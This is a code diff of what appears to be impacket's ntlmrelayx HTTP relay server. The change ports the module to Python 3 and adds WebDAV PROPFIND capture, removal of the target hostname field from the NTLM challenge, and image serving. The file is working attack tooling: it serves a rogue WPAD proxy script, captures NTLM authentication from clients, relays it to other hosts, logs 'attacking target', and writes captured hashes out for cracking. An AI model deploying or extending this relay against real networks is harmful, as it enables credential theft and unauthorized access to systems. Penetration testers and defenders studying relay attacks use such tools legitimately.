@@ -13,15 +13,15 @@
 # Description:
 #             This is the HTTP server which relays the NTLMSSP  messages to other protocols
 
-import SimpleHTTPServer
-import SocketServer
+import http.server
+import socketserver
 import socket
 import base64
 import random
 import struct
 import string
-import traceback
 from threading import Thread
+from six import PY2
 
 from impacket import ntlm, LOG
 from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
@@ -31,7 +31,7 @@ from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
 
 class HTTPRelayServer(Thread):
 
-    class HTTPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
+    class HTTPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
         def __init__(self, server_address, RequestHandlerClass, config):
             self.config = config
             self.daemon_threads = True
@@ -39,9 +39,9 @@ class HTTPRelayServer(Thread):
                 self.address_family = socket.AF_INET6
             # Tracks the number of times authentication was prompted for WPAD per client
             self.wpad_counters = {}
-            SocketServer.TCPServer.__init__(self,server_address, RequestHandlerClass)
+            socketserver.TCPServer.__init__(self,server_address, RequestHandlerClass)
 
-    class HTTPHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
+    class HTTPHandler(http.server.SimpleHTTPRequestHandler):
         def __init__(self,request, client_address, server):
             self.server = server
             self.protocol_version = 'HTTP/1.1'
@@ -52,7 +52,9 @@ class HTTPRelayServer(Thread):
             self.machineHashes = None
             self.domainIp = None
             self.authUser = None
-            self.wpad = 'function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1")) return "DIRECT"; if (dnsDomainIs(host, "%s")) return "DIRECT"; return "PROXY %s:80; DIRECT";} '
+            self.wpad = 'function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||' \
+                        '(host == "127.0.0.1")) return "DIRECT"; if (dnsDomainIs(host, "%s")) return "DIRECT"; ' \
+                        'return "PROXY %s:80; DIRECT";} '
             if self.server.config.mode != 'REDIRECT':
                 if self.server.config.target is None:
                     # Reflection mode, defaults to SMB at the target, for now
@@ -60,19 +62,19 @@ class HTTPRelayServer(Thread):
                 self.target = self.server.config.target.getTarget(self.server.config.randomtargets)
                 LOG.info("HTTPD: Received connection from %s, attacking target %s://%s" % (client_address[0] ,self.target.scheme, self.target.netloc))
             try:
-                SimpleHTTPServer.SimpleHTTPRequestHandler.__init__(self,request, client_address, server)
-            except Exception, e:
+                http.server.SimpleHTTPRequestHandler.__init__(self,request, client_address, server)
+            except Exception as e:
+                LOG.debug("Exception:", exc_info=True)
                 LOG.error(str(e))
-                LOG.debug(traceback.format_exc())
 
         def handle_one_request(self):
             try:
-                SimpleHTTPServer.SimpleHTTPRequestHandler.handle_one_request(self)
+                http.server.SimpleHTTPRequestHandler.handle_one_request(self)
             except KeyboardInterrupt:
                 raise
-            except Exception, e:
+            except Exception as e:
+                LOG.debug("Exception:", exc_info=True)
                 LOG.error('Exception in HTTP request handler: %s' % e)
-                LOG.debug(traceback.format_exc())
 
         def log_message(self, format, *args):
             return
@@ -80,7 +82,7 @@ class HTTPRelayServer(Thread):
         def send_error(self, code, message=None):
             if message.find('RPC_OUT') >=0 or message.find('RPC_IN'):
                 return self.do_GET()
-            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_error(self,code,message)
+            return http.server.SimpleHTTPRequestHandler.send_error(self,code,message)
 
         def serve_wpad(self):
             wpadResponse = self.wpad % (self.server.config.wpad_host, self.server.config.wpad_host)
@@ -104,18 +106,82 @@ class HTTPRelayServer(Thread):
             else:
                 return False
 
+        def serve_image(self):
+            with open(self.server.config.serve_image, 'r+') as imgFile:
+                imgFile_data = imgFile.read()
+                self.send_response(200, "OK")
+                self.send_header('Content-type', 'image/jpeg')
+                self.send_header('Content-Length', str(len(imgFile_data)))
+                self.end_headers()
+                self.wfile.write(imgFile_data)
+
         def do_HEAD(self):
             self.send_response(200)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
 
-        def do_AUTHHEAD(self, message = '', proxy=False):
+        def do_OPTIONS(self):
+            self.send_response(200)
+            self.send_header('Allow',
+                             'GET, HEAD, POST, PUT, DELETE, OPTIONS, PROPFIND, PROPPATCH, MKCOL, LOCK, UNLOCK, MOVE, COPY')
+            self.send_header('Content-Length', '0')
+            self.send_header('Connection', 'close')
+            self.end_headers()
+            return
+
+        def do_PROPFIND(self):
+            proxy = False
+            if (".jpg" in self.path) or (".JPG" in self.path):
+                content = """<?xml version="1.0"?><D:multistatus xmlns:D="DAV:"><D:response><D:href>http://webdavrelay/file/image.JPG/</D:href><D:propstat><D:prop><D:creationdate>2016-11-12T22:00:22Z</D:creationdate><D:displayname>image.JPG</D:displayname><D:getcontentlength>4456</D:getcontentlength><D:getcontenttype>image/jpeg</D:getcontenttype><D:getetag>4ebabfcee4364434dacb043986abfffe</D:getetag><D:getlastmodified>Mon, 20 Mar 2017 00:00:22 GMT</D:getlastmodified><D:resourcetype></D:resourcetype><D:supportedlock></D:supportedlock><D:ishidden>0</D:ishidden></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response></D:multistatus>"""
+            else:
+                content = """<?xml version="1.0"?><D:multistatus xmlns:D="DAV:"><D:response><D:href>http://webdavrelay/file/</D:href><D:propstat><D:prop><D:creationdate>2016-11-12T22:00:22Z</D:creationdate><D:displayname>a</D:displayname><D:getcontentlength></D:getcontentlength><D:getcontenttype></D:getcontenttype><D:getetag></D:getetag><D:getlastmodified>Mon, 20 Mar 2017 00:00:22 GMT</D:getlastmodified><D:resourcetype><D:collection></D:collection></D:resourcetype><D:supportedlock></D:supportedlock><D:ishidden>0</D:ishidden></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response></D:multistatus>"""
+
+            messageType = 0
+            if self.headers.getheader('Authorization') is None:
+                self.do_AUTHHEAD(message='NTLM')
+                pass
+            else:
+                typeX = self.headers.getheader('Authorization')
+                try:
+                    _, blob = typeX.split('NTLM')
+                    token = base64.b64decode(blob.strip())
+                except:
+                    self.do_AUTHHEAD()
+                messageType = struct.unpack('<L', token[len('NTLMSSP\x00'):len('NTLMSSP\x00') + 4])[0]
+
+            if messageType == 1:
+                if not self.do_ntlm_negotiate(token, proxy=proxy):
+                    LOG.info("do negotiate failed, sending redirect")
+                    self.do_REDIRECT()
+            elif messageType == 3:
+                authenticateMessage = ntlm.NTLMAuthChallengeResponse()
+                authenticateMessage.fromString(token)
+                if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
+                    LOG.info("Authenticating against %s://%s as %s\\%s SUCCEED" % (
+                        self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('utf-16le'),
+                        authenticateMessage['user_name'].decode('utf-16le')))
+                else:
+                    LOG.info("Authenticating against %s://%s as %s\\%s SUCCEED" % (
+                        self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('ascii'),
+                        authenticateMessage['user_name'].decode('ascii')))
+                self.do_ntlm_auth(token, authenticateMessage)
+                self.do_attack()
+
+
+                self.send_response(207, "Multi-Status")
+                self.send_header('Content-Type', 'application/xml')
+                self.send_header('Content-Length', str(len(content)))
+                self.end_headers()
+                self.wfile.write(content)
+                return
+
+        def do_AUTHHEAD(self, message = b'', proxy=False):
             if proxy:
                 self.send_response(407)
-                self.send_header('Proxy-Authenticate', message)
+                self.send_header('Proxy-Authenticate', message.decode('utf-8'))
             else:
                 self.send_response(401)
-                self.send_header('WWW-Authenticate', message)
+                self.send_header('WWW-Authenticate', message.decode('utf-8'))
             self.send_header('Content-type', 'text/html')
             self.send_header('Content-Length','0')
             self.end_headers()
@@ -145,9 +211,6 @@ class HTTPRelayServer(Thread):
         def do_CONNECT(self):
             return self.do_GET()
 
-        def do_HEAD(self):
-            return self.do_GET()
-
         def do_GET(self):
             messageType = 0
             if self.server.config.mode == 'REDIRECT':
@@ -171,19 +234,27 @@ class HTTPRelayServer(Thread):
             else:
                 proxy = False
 
-            if (proxy and self.headers.getheader('Proxy-Authorization') is None) or (not proxy and self.headers.getheader('Authorization') is None):
-                self.do_AUTHHEAD(message = 'NTLM',proxy=proxy)
+            if PY2:
+                proxyAuthHeader = self.headers.getheader('Proxy-Authorization')
+                autorizationHeader = self.headers.getheader('Authorization')
+            else:
+                proxyAuthHeader = self.headers.get('Proxy-Authorization')
+                autorizationHeader = self.headers.get('Authorization')
+
+            if (proxy and proxyAuthHeader is None) or (not proxy and autorizationHeader is None):
+                self.do_AUTHHEAD(message = b'NTLM',proxy=proxy)
                 pass
             else:
                 if proxy:
-                    typeX = self.headers.getheader('Proxy-Authorization')
+                    typeX = proxyAuthHeader
                 else:
-                    typeX = self.headers.getheader('Authorization')
+                    typeX = autorizationHeader
                 try:
                     _, blob = typeX.split('NTLM')
                     token = base64.b64decode(blob.strip())
-                except:
-                    self.do_AUTHHEAD(message = 'NTLM', proxy=proxy)
+                except Exception:
+                    LOG.debug("Exception:", exc_info=True)
+                    self.do_AUTHHEAD(message = b'NTLM', proxy=proxy)
                 else:
                     messageType = struct.unpack('<L',token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]
 
@@ -200,32 +271,33 @@ class HTTPRelayServer(Thread):
 
                 if not self.do_ntlm_auth(token,authenticateMessage):
                     if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
-                        LOG.error("Authenticating against %s://%s as %s\%s FAILED" % (
+                        LOG.error("Authenticating against %s://%s as %s\\%s FAILED" % (
                             self.target.scheme, self.target.netloc,
                             authenticateMessage['domain_name'].decode('utf-16le'),
                             authenticateMessage['user_name'].decode('utf-16le')))
                     else:
-                        LOG.error("Authenticating against %s://%s as %s\%s FAILED" % (
+                        LOG.error("Authenticating against %s://%s as %s\\%s FAILED" % (
                             self.target.scheme, self.target.netloc,
                             authenticateMessage['domain_name'].decode('ascii'),
                             authenticateMessage['user_name'].decode('ascii')))
 
-                    # Only skip to next if the login actually failed, not if it was just anonymous login or a system account which we don't want
+                    # Only skip to next if the login actually failed, not if it was just anonymous login or a system account
+                    # which we don't want
                     if authenticateMessage['user_name'] != '': # and authenticateMessage['user_name'][-1] != '$':
                         self.server.config.target.logTarget(self.target)
                         # No anonymous login, go to next host and avoid triggering a popup
                         self.do_REDIRECT()
                     else:
                         #If it was an anonymous login, send 401
-                        self.do_AUTHHEAD('NTLM', proxy=proxy)
+                        self.do_AUTHHEAD(b'NTLM', proxy=proxy)
                 else:
                     # Relay worked, do whatever we want here...
                     if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
-                        LOG.info("Authenticating against %s://%s as %s\%s SUCCEED" % (
+                        LOG.info("Authenticating against %s://%s as %s\\%s SUCCEED" % (
                             self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('utf-16le'),
                             authenticateMessage['user_name'].decode('utf-16le')))
                     else:
-                        LOG.info("Authenticating against %s://%s as %s\%s SUCCEED" % (
+                        LOG.info("Authenticating against %s://%s as %s\\%s SUCCEED" % (
                             self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('ascii'),
                             authenticateMessage['user_name'].decode('ascii')))
 
@@ -238,9 +310,14 @@ class HTTPRelayServer(Thread):
                     if self.server.config.outputFile is not None:
                         writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.config.outputFile)
 
-                    self.server.config.target.logTarget(self.target)
+                    self.server.config.target.logTarget(self.target, True, self.authUser)
 
                     self.do_attack()
+
+                    # Serve image and return 200 if --serve-image option has been set by user
+                    if (self.server.config.serve_image):
+                        self.serve_image()
+                        return
 
                     # And answer 404 not found
                     self.send_response(404)
@@ -252,12 +329,21 @@ class HTTPRelayServer(Thread):
             return
 
         def do_ntlm_negotiate(self, token, proxy):
-            if self.server.config.protocolClients.has_key(self.target.scheme.upper()):
+            if self.target.scheme.upper() in self.server.config.protocolClients:
                 self.client = self.server.config.protocolClients[self.target.scheme.upper()](self.server.config, self.target)
                 # If connection failed, return
                 if not self.client.initConnection():
                     return False
                 self.challengeMessage = self.client.sendNegotiate(token)
+
+                # Remove target NetBIOS field from the NTLMSSP_CHALLENGE
+                if self.server.config.remove_target:
+                    av_pairs = ntlm.AV_PAIRS(self.challengeMessage['TargetInfoFields'])
+                    del av_pairs[ntlm.NTLMSSP_AV_HOSTNAME]
+                    self.challengeMessage['TargetInfoFields'] = av_pairs.getData()
+                    self.challengeMessage['TargetInfoFields_len'] = len(av_pairs.getData())
+                    self.challengeMessage['TargetInfoFields_max_len'] = len(av_pairs.getData())
+
                 # Check for errors
                 if self.challengeMessage is False:
                     return False
@@ -266,7 +352,7 @@ class HTTPRelayServer(Thread):
                 return False
 
             #Calculate auth
-            self.do_AUTHHEAD(message = 'NTLM '+base64.b64encode(self.challengeMessage.getData()), proxy=proxy)
+            self.do_AUTHHEAD(message = b'NTLM '+base64.b64encode(self.challengeMessage.getData()), proxy=proxy)
             return True
 
         def do_ntlm_auth(self,token,authenticateMessage):
@@ -315,8 +401,14 @@ class HTTPRelayServer(Thread):
 
     def run(self):
         LOG.info("Setting up HTTP Server")
+
+        if self.config.listeningPort:
+            httpport = self.config.listeningPort
+        else:
+            httpport = 80
+
         # changed to read from the interfaceIP set in the configuration
-        self.server = self.HTTPServer((self.config.interfaceIp, 80), self.HTTPHandler, self.config)
+        self.server = self.HTTPServer((self.config.interfaceIp, httpport), self.HTTPHandler, self.config)
 
         try:
              self.server.serve_forever()
